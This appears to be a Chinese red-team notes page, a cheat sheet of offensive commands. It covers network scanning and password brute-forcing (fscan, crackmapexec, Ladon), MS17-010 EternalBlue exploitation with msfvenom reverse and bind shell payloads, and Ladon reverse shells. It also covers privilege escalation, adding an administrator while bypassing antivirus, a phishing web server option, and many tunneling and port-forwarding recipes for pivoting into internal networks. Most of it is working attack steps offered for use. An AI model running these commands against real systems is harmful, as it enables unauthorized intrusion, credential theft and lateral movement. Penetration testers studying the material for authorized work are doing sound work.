https://gitee.com/windyjxx/projects
[红队框架工具列表｜收藏](https://mp.weixin.qq.com/s/xiM3deP1UWrsvki8LjAnvA)

## 信息收集

[ENScan_GO | 剑指 HW/SRC，解决在 HW/SRC 场景下遇到的各种针对国内企业信息收集难题](https://github.com/wgpsec/ENScan_GO)

[隧道？代理？端口转发？（一文读懂）](https://mp.weixin.qq.com/s/PDIWU-xej9SffRXlDEJYdA)
[常用的端口转发方式](https://mp.weixin.qq.com/s/VjFb77ALUKSzenKQYI42jA)

[云资产 | LC 多云攻击面资产梳理开源工具](https://mp.weixin.qq.com/s/fmMVkNUkWGgXlHuVdbkGgA)

[JS 敏感泄露小帮手----WIH](https://mp.weixin.qq.com/s/AF2n260g0Q3GyRFNycrm4Q)

### fscan

```bash
fscan -h 10.63.81.21 -p 1-65535 -np
fscan -h 10.63.81.21 -p 1-65535 -np -nobr
# -m 参数见 plugins目录
## 密码爆破 smb smb2 rdp 都可以
fscan -h 192.168.127.137 -m smb -user administrator -pwdf pwd.txt
fscan -h 192.168.127.137 -m rdp -user administrator -pwdf pwd.txt
```

### kscan

kscan.exe -t 10.0.0.0/8 --hydra --hydra-pass file:pwd.txt

### crackmapexec

```bash
crackmapexec smb <ip>/24 -u <useranme> -p <password>
crackmapexec smb 172.22.3.0/24 -u a -p a
crackmapexec smb 172.22.3.0/24 -u ./ufile -p ./pfile
# 检查用户名密码字典使用时，一行用户对应一行密码，不进行交叉测试：
crackmapexec smb 192.168.1.101 -u user.txt -p password.txt --no-bruteforce --continue-on-succes
# --continue-on-success 在爆破成功后继续爆破
```

## C2 工具类似 msf

empire && starkiller VS metasploit && armitage

empire && starkiller 的体验还不错

- Havoc
- Sliver
- BRC4

## 内网相关/内网穿透

[干货|通过边界代理一路打到三层内网+后渗透通用手法](https://mp.weixin.qq.com/s/uDPCkbWcp-upMH3r2x1WMA)
[不同中间件端口复用代理解决方案](https://9bie.org/index.php/archives/969/)
[Neo-reGeorg -- php](https://blog.csdn.net/qq_42094992/article/details/115143527)
[分享几款免费实用的国产内网穿透工具](https://mp.weixin.qq.com/s/QVH3e18fE_jF_0y3rd5pLw)

frp/nps

-- for xp/2003
3proxy 7.x / CCProxy
nc
[lcx](https://github.com/UndefinedIdentifier/LCX)

[内网渗透中隧道渗透技术](https://blog.csdn.net/qq_17204441/article/details/88834324)
[内网渗透之主机出网 OR 不出网隧道搭建](https://www.freebuf.com/articles/web/255801.html)

边界代理

- 代理类别：HTTP 代理、socks 代理、telnet 代理、ssl 代理
- 代理工具： [EarthWorm](https://mp.weixin.qq.com/s/Ss9IhP0WEWVmABxZfYXXgQ) 、reGeorg(http 代理)、proxifier(win)、sockscap64(win)、proxychains(linux)

## 端口转发

### tcptunnel/端口转发

[tcptunnel 利用 TCP 隧道让内网不出网主机上线 MSF](https://mp.weixin.qq.com/s/iDAAC3BRPj2YaWkNZPWEDQ)

> 192.168.0.120 为边缘机器

```bash
# x64
192.168.142.110$ tcptunnel --local-port=1080 --remote-port=4444 --remote-host=192.168.0.120 --fork --buffer-size=8192 --stay-alive
# x86
192.168.142.110$ tcptunnel --local-port=1080 --remote-port=4444 --remote-host=192.168.0.120 --buffer-size=8192 --stay-alive

# 把26666端口流量转发到远程vps
nohup ./tcptunnel --local-port=26666 --remote-port=26666 --remote-host=1.1.1.1 --buffer-size=8192 --stay-alive &


## msf
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.142.110 lport=1080 -f exe -o shell.exe
```

### lcx/端口转发

nb -tran 8000 192.168.127.134:8000
nb -tran 1235 192.168.127.134:1235

```bash
# 正向转发 lcx.exe -tran LocalPort RemoteHost RemotePOrt
lcx.exe -tran 1234 192.168.10.10 3389

# 反向转发
# 示例1 kali机以Win7为跳板机登录Win10
## Win7上执行: 将9000 转发到 9001
## lcx.exe -listen SourcePort  TargetPort
lcx.exe -listen 9000 9001

## 将win10 3389 转发到 Win7: 9000 端口，在Win10上执行：
## lcx.exe -slave RemoteHost RemotePort LocalHost LocalPort
lcx.exe -slave 192.168.10.10 9000 127.0.0.1 3389

## kali连接9001：
rdesktop 192.168.10.10:9001
```

### iox 端口转发

0.0.0.0:80 的流量转发至 127.0.0.1:81

```sh
root@ubuntu:/tmp# ./iox fwd -l 80 -r 127.0.0.1:81
```

### nc

[nc 端口转发](https://ssooking.github.io/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/)

```bash
# 跳板机: 8888 转到 153 的 22端口上
nc -l -p 8888 -c "nc 192.168.19.153 22"
```

自动循环连接

```bash
while :; do (nc -l -p 8888 -c "nc 192.168.19.153 22"); done
```

## MS17-010: AutoBlue-MS17-010

[​MS17010 打法](https://mp.weixin.qq.com/s/UM7frymXiyTEvrJC3wNMYw) [L1](https://www.youtube.com/watch?v=p9OnxS1oDc0) [L2](https://www.youtube.com/watch?v=_uLJB_Ys120&t=688s)
[py/Cobalt Strike DLL](https://www.cnblogs.com/Thorndike/p/15242477.html)
[Ladon 0day 通用 DLL 生成器-MS17010 演示 上线 CS](http://k8gege.org/Ladon/cmddll.html)

常用

```sh
Ladon.exe 192.168.50.153 MS17010
# 多打几次
fscan.exe -h 192.168.50.0/24 -m ms17010 -sc add
# sysadmin 1qaz@WSX!@#4

ksmb 192.168.1.89
# proxifier 添加 eternalblue.dat
# 3. https://www.freebuf.com/vuls/356052.html
Eternalblue
```

### python AutoBlue 使用

```shell
# 1. config
./shell_prep.sh

# 2. create shell 普通反弹shell, 成功率较高
LHOST for reverse connection:
192.168.183.231
LPORT you want x64 to listen on:
1234
LPORT you want x86 to listen on:
1234
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
Type 0 to generate a staged payload or 1 to generate a stageless payload
1

## 3. Listen 攻击机
nc -lvvp 1234

## 4. expoloit 新终端 执行, 稍等2秒, 没效果再执行, 直到反弹成功
python eternalblue_exploit7.py 192.168.183.128 shellcode/sc_x64.bin
### 如果是meterpreter, 要用sc_x64_msf.bin, 比上面容易蓝屏 成功率不高
python eternalblue_exploit7.py 192.168.183.128 shellcode/sc_x64_msf.bin
```

```shell
# server2003_win xp
python2 checker.py ip
python2 zzz_exploit.py ip

# server2008_win7
x86 推荐使用
python2 eternalblue_exploit7.py ip shellcode/msfexecx86.bin
# x64 推荐使用
python2 eternalblue_exploit7.py ip shellcode/sc_all.bin

# server2012_win8.1+
python2 eternalblue_exploit8.py ip shellcode/sc_all.bin
```

### Eternalblue

```
Eternalblue-2.2.0.exe --InConfig Eternalblue-2.2.0.xml --TargetIp 10.10.20.7 --TargetPort 445
msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=1125 -f dll -o bind.dll
Doublepulsar-1.3.1.exe --InConfig Doublepulsar-1.3.1.xml --TargetIp 192.168.52.143 --TargetPort 445 --Protocol SMB --Architecture x64 --Function RunDLL --DllPayload bind.dll --payloadDllOrdinal 1 --ProcessName lsass.exe --ProcessCommandLine "" --NetworkTimeout 60
```

zzz_exploit.py

````
# Pipe
netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER db2remotecmd ```netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER db2remotecmd
python zzz_exploit.py <ip> <pipe>
````

### Ladon/proxifier

proxifier 不支持 ICMP 或者说 ew 等代理工具也不支持 ICMP 协议，所以代理后探测存活主机就不要使用 Ping 或 OnlinePC 模块了，使用扫描模块需加 noping 参数，非扫描模块不需要 noping。探测存活主机可使用 osscan、webscan、urlscan、ms17010、smbghost 等模块，

- [Usage](https://github.com/k8gege/Ladon/wiki/Ladon-Usage)
- [INI 插件-Ladon 一秒 POC 批量检测、域渗透内网批量横向执行命令教程](https://mp.weixin.qq.com/s/2H-iFnJRhDhT6lV3I-VeUw)

检测

```shell
Ladon 192.168.1.8 MS17010
Ladon 192.168.1.8/24 MS17010
Ladon 192.168.1.8/c MS17010
Ladon 192.168.1.50-192.168.1.200 ICMP
Ladon ip24.txt ICMP
Ladon 192.168.1.8 WhatCMS # 扫描IP
Ladon noping 192.168.1.8 WhatCMS # 扫描IP 禁PING扫描
Ladon 172.20.10.1/24 WebScan
Ladon noping 10.x.x.x PortScan
Ladon noping 10.x.x.x PortScan 21,22,80
```

bypass 杀软 添加管理员

```bash
powershell -exec bypass Import-Module .\Ladon.ps1.Ladon AddAdmin admin888 123456
```

正向代理 Socks5

```shell
Ladon Socks5 192.168.1.8 1080
```

使用 proxifier 代理扫描, 代理工具不支持 ICMP，必须加 noping

```sh
Ladon noping 10.1.2.8/24 MS17010
```

[密码爆破](http://k8gege.org/Ladon/sshscan.html)

```shell
# 扫描C段445端口Windows机器弱口令
Ladon 192.168.1.8/24 SmbScan
Ladon 192.168.1.8/24 SshScan
Ladon 192.168.1.8/24 FtpScan
Ladon 192.168.1.8/24 MysqlScan
# 扫描C段1521端口Oracle服务器弱口令
Ladon 192.168.1.8/24 OracleScan

# 扫描C段27017端口MongoDB服务器弱口令
Ladon 192.168.1.8/24 MongodbScan

# 扫描C段1521端口Oracle服务器弱口令
Ladon 192.168.1.8/24 SqlplusScan

# 扫描C段5985端口Winrm服务器弱口令
Ladon 192.168.1.8/24 WinrmScan
Ladon 192.168.1.8/24 RedisScan

# 扫描C段8728端口RouterOS路由器
Ladon 192.168.1.8/24 RouterOSScan
```

5、远程命令执行

```shell
Ladon SshCmd host port user pass cmd
Ladon WinrmCmd host port user pass cmd
Ladon PhpShell url pass cmd
Ladon PhpStudyDoor url cmd
```

Potato 提权

```shell
Ladon SweetPotato whoami # win7,2012r2
Ladon SweetPotato shell.exe
Ladon badpotato # win8
```

[反弹 shell](http://k8gege.org/Ladon/ReverseShell.html)

```shell
# 反弹 NC shell
Ladon ReverseTcp 192.168.1.8 4444 nc
# 反弹MSF TCP Shell
Ladon ReverseTcp 192.168.1.8 4444 shell
# 反弹MSF TCP Meter
Ladon ReverseTcp 192.168.1.8 4444 meter
```

#### Ladon 10

- 0x001 GodPotato 提权

支持: Win8-Win11/Win2012-2022 服务提权至 SYSTEM

```sh
Ladon GodPotato whoami
```

- 0x002 hikvision

```
0x002 hikvision 海康威视 CVE-2017-7921漏洞检测

Ladon 192.168.1.8/24 HikvisionPoc
Ladon http://192.168.1.8:8080 HikvisionPoc
Ladon url.txt HikvisionPoc

0x003 hikvision 海康威视 密码审计

Ladon 192.168.1.8/24 HikvisionScan
Ladon http://192.168.1.8:8080 HikvisionScan
Ladon url.txt HikvisionScan


0x004 hikvision 海康威视 配置文件解密

存在CVE-2017-7921漏洞，可下载配置文件，使用以下命令解密

Ladon HikvisionDecode configurationFile
```

- 0x005 RunSystem 提权

```sh
Ladon RunSystem cmd.exe
Ladon RunUser cmd.exe
Ladon RunSystem c:\1.exe
```

0x006 RunToken 复制令牌

复制指定进程令牌执行任意程序，system 权限下，某些工具无法直接使用，如 Chrome 密码读取，未做降权处理的工具将无法读取，使用 Runtoken 模块可复制对应进程令牌执行，如 explorer 进程，切换后除了可以读取密码外，还能让 VNC 等或未做降权的 C2 程序可查看目标远程桌面，实际使用将 cmd.exe 替换成全路径的自定义 exe 即可，若是存在多个参数可以使用 bat 文件来执行。

```sh
Ladon RunToken explorer cmd.exe
Ladon RunToken explorer c:\1.bat
```

- 0x008 彻底关闭 SMB、禁用 445 阻止 0day、横向移动、中继攻击等

```sh
Ladon Load CloseSMB
```

- 0x009 Safe008 一键安全加固工具

- 0x009 禁用指定服务

```sh
Ladon DisService Spooler
Ladon DisableService Spooler
```

- 0x010 停止指定服务

```sh
Ladon StopService Spooler
```

- 0x011 放行端口、阻止端口

```sh
Ladon OpenTCP  445
Ladon OpenUDP  161
Ladon CloseTCP  445
Ladon CloseUDP  161
```

- 0x012 PowerShell 用法

```sh
powershell -exec bypass Import-Module .\Ladon.ps1;Ladon whoami
```

powershell 版使用同样非常简单，只需最后的“Ladon whoami”命令，替换成你想要执行的命令即可，

#### Web

```bash
Ladon WebServer 800
Ladon Web 800 dir
Ladon Web 800 c:\webroot
Ladon Web 800 fish /login google.com
```

#### ini

[ini 插件教程](https://mp.weixin.qq.com/s/2H-iFnJRhDhT6lV3I-VeUw)

```sh
Ladon 192.168.52.0/24 myini\ping.ini   # 检测C段
Ladon 192.168.1.8/b   ping.ini  检测B段
Ladon ip.txt ping.ini  检测IP列表 (ip.txt里放准备好的ip)

# Ladon批量Schtask执行命令

Ladon 10.1.10.8/24 SchtaskScan.ini   检测C段
Ladon 10.1.10.8/b SchtaskScan.ini    检测B段
Ladon ip.txt SchtaskScan.ini         批量检测IP列表
Ladon ip24.txt SchtaskScan.ini       批量检测C段列表
Ladon ip16.txt SchtaskScan.ini       批量检测B段列表

# Ladon批量执行wmiexec

Ladon 10.1.10.8/24 WmiScan.ini   检测C段
Ladon 10.1.10.8/b WmiScan.ini     检测B段
Ladon ip.txt WmiScan.ini               批量检测IP列表
Ladon ip24.txt WmiScan.ini           批量检测C段列表
Ladon ip16.txt WmiScan.ini           批量检测B段

# Winrm远程命令/端口复用后门/WinrmCmd/密码爆破
# http://k8gege.org/Ladon/WinrmScan.html

# CVE-2022-1388  F5 BIG-IP 批量F5漏洞检测命令

Ladon 192.168.60.1/24 F5poc.ini  检测C段
Ladon 192.168.60.1/b F5poc.ini    检测B段
Ladon ip.txt F5poc.ini               批量检测IP列表
Ladon ip24.txt F5poc.ini           批量检测C段列表
Ladon ip16.txt F5poc.ini           批量检测B段列表

# pythonpoc

Ladon tar.txt pythonpoc.ini
Ladon url.txt pythonpoc.ini
```

# proxy 代理

[ICMP/TCP 隧道 | 内网代理和穿透工具的分析记录](https://mp.weixin.qq.com/s/jpmi7CfvcOmL4qkSBKLvKQ)
[ICMP 隧道 | ICMP 协议隧道穿透之 pingtunnel](https://mp.weixin.qq.com/s/7nrLU_QcDGpotz77n-NsKQ)
[ICMP 隧道 | 内网知识之 ICMP 隧道搭建](https://mp.weixin.qq.com/s/lPiYez6ZrVqlRg54dOG4Tg)
[DNS 隧道 | Cobalt Strike 的使用（二）](https://mp.weixin.qq.com/s/qLtfmiBVEb9pEfmcAb0RMw)
[Linux 或 Windows 上实现端口映射](https://mp.weixin.qq.com/s/V9iw_Z0B-dTJikvnwLUEAQ)
[内网代理和穿透工具的分析记录 | Vemon](https://mp.weixin.qq.com/s/pV9nQ6uzLTT2cqO1ZaJz6w)
[【Tips+1】IOX 反向穿透四层网段](https://mp.weixin.qq.com/s/9mcF_Snk-loPO-ApI5ECag)

多层代理攻击方式

1. proxychains
2. msf route flush;set Proxies socks5:127.0.0.1:8989
3. frp 映射代理到攻击，再按 1，2 操作。

## proxychains

只对 tcp 流量有效，所以 udp 和 icmp 都是不能代理转发的。 有 ping 之类的扫描工具要关掉

proxychains4 -q -f proxychains.conf python3 ldapshell.py xiaorang.lab/Aldrich:111qqq...@172.22.8.15

## frp/多级代理/端口转发

[神兵利器 | Frp 搭建多层内网通信隧道总结（建议收藏）](https://mp.weixin.qq.com/s/mO378TD7Jp3R8x7e7EpOCg)
[隧道？代理？端口转发？（一文读懂）](https://mp.weixin.qq.com/s/PDIWU-xej9SffRXlDEJYdA)

https://www.jianshu.com/p/42861aa3fea2

- 常规方式

1. 攻击机 kali: 192.168.50.80 启监听 `./frps` 或配置

```conf
[common]
bind_addr = 0.0.0.0
bind_port = 7000
```

2. 拿到靶机后 Debian 启动 `frpc -c frpc.ini` ，配置文件如下：

```conf
[common]
server_addr = 192.168.53.132
server_port = 7000
[socks5]
type = tcp
remote_port = 8989
plugin = socks5
```

3.可使用代理 192.168.50.80:8989

- 其他使用 frpc

```shell
frpc tcp -s 192.168.50.161:7000 -l 1234 -r 8080
# 相当于
[common]
server_addr = 127.0.0.1
server_port = 7000

[tcp1]
type = tcp
local_ip = 127.0.0.1
local_port = 1234
remote_port = 8000 # 本地1234启动http-server 远程访问 192.168.50.161:8080
```

### 命令行方式

不能做复杂配置

```bash
# frps.ini
[common]
server_addr = 127.0.0.1
server_port = 7000
token = frp123

# frpc
.\frpc tcp  -s "127.0.0.1:7000" -t frp123 -i "127.0.0.1" -l "2125"
```

## stowaway/多级代理/端口转发

```sh
# 攻击机
admin.exe -l 8899 -s 123
# 被控机
agent -c 192.168.52.1:8899 -s 123 --cs gbk # 类似reverse_tcp
agent -l 10000 -s 123 # 主机 connect 过去，类似 bind

admin> help
admin> detail
admin> use 1 # use 2, 选择节点

(node 0) >> help
(node 0) >> shell
cmd >> chcp 65001
(node 0) >> upload C:\test.txt
(node 0) >> download C:\test.txt
(node 0) >> addmemo test  # 添加备忘录
(node 0) >> delmemo
# 端口转发, 将 node 0 端口转到 攻击机 888
(node 0) >> forward 888 127.0.0.1:3389
# 建立代理, 攻击机:2222
(node 0) >> socks 2222
# ssh
(node 0) >> ssh 127.0.0.1:22
# backward: 反向映射当前agent上的端口至admin的本地端口
(node 0) >> backward 9001 22

# 多级代理
## 方式1 bind
agent1$ agent -c 192.168.3.5:888 -s 123
agent2$ agent -l 10000 -s 123
回到 admin端 ( node 0) >> connect 192.168.10.2:10000

## 方式2 reverse
agent1$ agent -c 192.168.3.5:888 -s 123
admin端: use 0 -> listen -> 选择1.Normal Passive -> 输入10001 从而使得agent-1监听在10001端口上，并等待子节点的连接
agent2$ agent -c 192.168.1.44:10001 -s 123

# sshtunnel 没用过。再议
```
多级代理

[drawlink](https://pixso.cn/app/editor/LasOE-_SNRRsiADn76wGvA)

![alt text](../../public/imgs/rw_proxy_stowaway1.png)

![alt text](../../public/imgs/rw_proxy_stowaway2.png)

## chisel

```sh
wget http://10.10.16.5/chisel_1.9.1_linux
./socat tcp-listen:60218,reuseaddr,fork tcp:192.168.122.228:5985 &
./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
./chisel_1.9.1_linux_amd64 client 10.10.14.39:8001 R:socks
./socat tcp-listen:55555,reuseaddr,fork tcp:192.168.122.228:5985
./socat tcp-listen:5985,reuseaddr,fork tcp:10.10.16.5:55555
```

## goproxy

```shell
proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon

# 二级代理HTTP: 使用本地端口8090，假设上级HTTP代理是22.22.22.22:8080
proxy http -t tcp -p "0.0.0.0:8090" -T tcp -P "22.22.22.22:8080"

# 一级TCP: 本地33080端口就是访问192.168.22.33的22端口。
proxy tcp -p ":33080" -T tcp -P "192.168.22.33:22"
# 二级TCP: 本地23080端口就是访问22.22.22.33的8080端口。
## VPS(IP:22.22.22.33)执行:
proxy tcp -p ":33080" -T tcp -P "127.0.0.1:8080"
## 本地执行:
proxy tcp -p ":23080" -T tcp -P "22.22.22.33:33080"

```

## ssh

- [『杂项』使用 SSH 实现三层网络穿透](https://mp.weixin.qq.com/s/RPM5UZcs4EwO0S7K7zaFBw)

![640 _1_.png](https://s2.loli.net/2023/04/10/cwQmkx8PrqvgT9b.png)

```sh
# vps的localhost监听29999端口  SOCKS 协议代理
## 还需要利用frp把vps的29999端口映射到外部的39999端口，配置文件如下：
vps$ ssh -N -D 29999 root@192.168.0.2

[common]
server_addr = 1.1.1.1
server_port = 7000

[yj]
type = tcp
local_ip = 127.0.0.1
local_port = 29999
remote_port = 39999
```

- 本地转发: 将 Ubuntu:22 转到 kali:222

```sh
#  Kali 上执行
ssh -CfNg -L 222:10.10.10.2:22 root@172.20.10.4
ssh root@127.0.0.1 -p 222

# eg.2
ssh -L 2121:www.example.com:80 tunnel-host -N # 访问本机的 2121 端⼝，就是访问 www.example.com 的80
```

- 远程转发: 在远程主机上监听一个端口，所有远程主机指定的数据都会通过 SSH 隧道传输到本地主机的对应端口，远程转发相当于反向代理。
- 将 Kali:222 转发到 Ubuntu:22

```bash
Linux$ ssh -CfNg -R 222:10.10.10.2:22 root@172.20.10.5
 Kali$ ssh root@127.0.0.1 -p 222

# eg.2
ssh -R 8080:localhost:80 -N my.public.server # ⽤户访问 my.public.server:8080 ，就会⾃动映射到 localhost:80
```

- 动态转发: 代理

```bash
# 本机监听端口
kali$ ssh -CfNg -D 6666 root@172.20.10.4
## sudo vim /etc/proxychains.conf 添加 socks5 127.0.0.1：6666

# 远程主机监听端口 代理为 1.1.1.1:9050
kali$ ssh tunneluser@1.1.1.1 -R 9050 -N
## B有互联网,A没有, 映射并创建代理为 A:8080, 可上互联网
A$ ssh -R 8080:localhost:8080 user@B的IP地址
```

- 示例: 三层网络穿透

```bash
Linux$ ssh -CfNg -R 222:10.10.10.2:22 root@172.20.10.5
 Kali$ ssh -CfNg -D 0.0.0.0:2222 root@127.0.0.1 -p 222
 Kali$ sudo vim /etc/proxychains.conf # 添加 socks5 127.0.0.2222
 Kali$ proxychains msfconsole
```

---

![](https://s2.loli.net/2022/12/31/vdz5bXjOt368sHW.png)

```sh
ssh -L localport:remotehost:remotehostport sshserver
```

| Label          | Desc                                                        |
| -------------- | ----------------------------------------------------------- |
| localport      | 本机开启的端口号                                            |
| remotehost     | 连接机器的 IP 地址                                          |
| remotehostport | 转发机器的端口号                                            |
| sshserver      | 转发机器的 IP 地址                                          |
| Options        |                                                             |
| -L             | 表示 Local Port Forwarding，即本地端口转发                  |
| -f             | 后台启用                                                    |
| -N             | 不打开远程 shell，处于等待状态(不加-N 则会进入分配的命令行) |
| -g             | 启用网关功能                                                |

![](https://s2.loli.net/2022/12/31/OVPkim34YNj5Wwy.png)

1.SSH 远程端口转发

```shell
# 示例1
PC1$ useradd tunneluser -m -d /home/tunneluser -s /bin/true
PC1$ passwd tunneluser
PC1$ ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N # 跳板机1.1.1.1 将3389 转发到 内网 3.3.3.3:3389
## 攻击者
attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPasswd


# 示例2 将A:6666 转发为 B->C:80
# B:192.168.0.106 C:10.10.10.154
ssh -fN -L 本地端口:目标IP:目标端口   root@192.168.0.106
ssh -fN -L 6666:10.10.10.154:80 root@192.168.0.106
# 解析:A在本地访问自己的6666端口，就相当于通过B访问C的80端口
# 即通过B将C的80端口转发到本地6666端口
```

![](https://s2.loli.net/2022/12/31/IAcaVtw671PUevX.jpg)

2.SSH 本地端口转发

适用不出网机器, 允许我们从通常无法连接回我们的主机运行反向 shell

从 attacker-pc 转发 80 并从 PC-1 使其可用

```shell
# 格式: ssh -N -L *:local_port:127.0.0.1:server_port tunne1user@1.1.1.1
# pc-1:2.2.2.2, 将pc-1:80 转发到 1.1.1.1,  访问 pc-1:80相当于访问 1.1.1.1:80
PC-1$ ssh tunne1user@1.1.1.1 -L *:80:127.0.0.1:80 -N
PC-1$ netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

示例 2 开启代理, 通过代理的所有命令从 192.168.50.161 执行

```shell
# 示例 2, -p 指服务器 ssh的端口, 通过
ssh -f -N -D 127.0.0.1:1080 ubuntu@192.168.50.161 -p 2222
```

| Args | Desc                           |
| ---- | ------------------------------ |
| -f   | 后台运行                       |
| -N   | 不执行远程命令，只进行端口转发 |
| -D   | SOCKS 代理的端口               |

### 端口转发/服务器的 80，转发到客户端本地的 80

- 需要 root 权限
- 访问 ubuntu 的 80 端口会被转发到 ubuntu 的 79 端口，ubuntu 的 79 端口会转发到我们本机的 80 端口

注意：由于 SSH 的反向端口转发监听的时候只会监听 127.0.0.1，所以这时候需要点技巧
如图所示，即使反向端口转发 79 端口指定监听全部 `(-R \*:79:127.0.0.1:80)`，端口 79 依旧绑定在了 127.0.0.1（图中顺便把 socks5 代理也开了）

```sh
kali@129$ ssh -i id_rsa root@47.92.254.136 -D 0.0.0.0:1080 -R \*:79:127.0.0.1:80
# socat，让 0.0.0.0:80 转发到 127.0.0.1:79，再反向转发回客户端本地的 80 ,变相使 80 监听在 0.0.0.0
root@47.92.254.136$ nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &
kali@129$ nc -lvvp 80
# 向 47.92.254.136 的80端口tcp发消息在kali上就能接收到
```

## socat 端口转发

有时不行换 frp

```shell
# 让 0.0.0.0:80 转发到 127.0.0.1:79
nohup socat TCP4-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &
# 本地 1234 转发到 远程 4321
socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
# 本地 80 转发到远程 80
socat -d -d -lh -v TCP4-LISTEN:80,fork TCP4:192.168.1.215:80
# 本地 822 转发到 本地 8080
socat TCP4-LISTEN:822,fork TCP4::8080
```

[SSH+socat](https://blog.51cto.com/u_14028678/3847755)

```shell
# ssh 监听本地1080 有数据时 转移到 SSH 连接上面，随后发往远程主机。
# 本地的 445端口数据通过sock代理转发到10.10.10.129的445端口上。
PC-1$ ssh -D 1080 user@192.168.175.146
PC-1$ socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445
# socat->sock默认端口就是 1080 ，使用其他端口要在最后指定 socksport=<port>
# 将 PC-1:445的数据, 通过 192.168.175.146 转发到 192.168.232.132:445
```

![](https://s2.51cto.com/images/blog/202109/10/944febf3e0d057a36652ad7fba9f3e09.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=/format,webp/resize,m_fixed,w_1184)

该选项允许 socat 为收到的每个连接分叉一个新进程，从而可以在不关闭的情况下处理多个连接。如果不包括它，socat 将在第一个连接完成后关闭。 fork
回到我们的示例，如果我们想使用 PC-1 作为透视访问服务器上的端口 3389，就像我们对 SSH 远程端口转发所做的那样，我们可以使用以下命令

```shell
# 将 3.3.3.3:3389 挂载到 localhost:3389
PC-1$ socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
```

请注意，socat 不能像 SSH 那样将连接直接转发到攻击者的计算机，但会在 PC-1 上打开一个端口，然后攻击者的计算机可以连接到该端口:

![](https://s2.loli.net/2023/01/01/1m9HgVTQbzJRjYW.png)

```shell
# 开防火墙 3389 端口
PC-1$ netsh advfirewall firewall localport=3389 add rule name="Open Port 3389" dir=in action=allow protacol=TCP
# 将 1.1.1.1:80服务 挂载到 localhost:80
PC-1$ socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
```

## gost 端口转发 -- 很全面

[Link](https://blog.csdn.net/zzlufida/article/details/82972053)
[doc v2](https://v2.gost.run/configuration/)
[doc v3](https://latest.gost.run/)

**创建代理**

```bash
gost -L :8080 # http+socks5
gost -L user:pass@:8080 # http+socks5 带验证
```

**端口转发:**
将 1.1.1.1:9000 转发到 2.2.2.2:8080
PC1: 1.1.1.1
PC2: 2.2.2.2

```shell
# 创建代理
PC-1$ gost -L socks5://:2080
# 访问 1.1.1.1:9000 显示 2.2.2.2:8080
PC-2$ gost -L=rtcp://:9000/:8080 -F=socks5://1.1.1.1:2080
PC-2$ gost -L=rtcp://:9000/127.0.0.1:8080 -F=socks5://1.1.1.1:2080
# 转发多个端口
PC-2$ gost -L=rtcp://:9001/:8081 -L=rtcp://:9000/:8080 -F=socks5://192.168.50.232:2080


# 本地端口转发, 可转成走代理的端口
gost -L=tcp://:1234/192.168.50.80:8000 # 1234端口转发到 192.168.50.80:8000
gost -L=tcp://:2222/192.168.1.1:22 [-F=...]
## 一对多转发, 在每次收到转发请求后，会利用转发器中的节点选择器在目标地址列表中选择一个节点作为本次转发的目标地址。
gost -L tcp://:8080/192.168.1.1:80,192.168.1.2:80,192.168.1.3:8080?strategy=round&maxFails=1&failTimeout=30s

# 远程端口转发, 将172.24.10.1:2222上的数据(通过代理链)转发到192.168.1.1:22上,当代理链末端(最后一个-F参数)为SSH转发通道类型时，gost会直接使用SSH的远程端口转发功能:
gost -L=rtcp://:2222/192.168.1.1:22 [-F=... -F=socks5://172.24.10.1:1080]
## 例1 将 1.1.1.1:2126 显示 本地的80
gost -L :2125 # VPS服务端启动代理
gost -L=rtcp://:2126/:80 -F=socks5://1.1.1.1:2125

gost -L=forward+ssh://:2222 # 服务端:
gost -L=rtcp://:2222/192.168.1.1:22 -F forward+ssh://server_ip:2222


# 代理链
gost -L=:8080 -F=quic://192.168.1.1:6121 -F=socks5+wss://192.168.1.2:1080 -F=http2://192.168.1.3:443 ... -F=a.b.c.d:NNNN
```

代理模式

```shell
# 默认是 http+socks5
gost -L=:8080
# 将 socks4 转成 http/socks5
gost -L=:8080 -F=socks4://192.168.50.161:43848
```

## nginx 端口转发

https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/dai-xie#nginx

[Nginx后门集合](https://mp.weixin.qq.com/s/_vtabaOr3BS0SlQzarK9XA)

## tocks

apt-get install tsocks  
vi /etc/tsocks.conf

```shell
local = 192.168.1.0/255.255.255.0  #local表示本地的网络，也就是不使用socks代理的网络
local = 127.0.0.0/255.0.0.0
server = 127.0.0.1   #socks服务器的IP
server_type = 5  #socks服务版本
server_port = 8888  # socks服务使用的端口
```

run

```shell
tsocks curl http://myexternalip.com &
```

## pystinger 仅 web 服务权限不出网使用

[Link](https://cloud.tencent.com/developer/article/2036092)

假设不出网服务器域名为 http://example.com:8080 ,服务器内网 IP 地址为 192.168.3.11

SOCK4 代理

```
1. proxy.jsp上传到目标服务器,确保 http://example.com:8080/proxy.jsp 可以访问,页面返回 UTF-8
2. 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行start D:/XXX/stinger_server.exe启动服务端
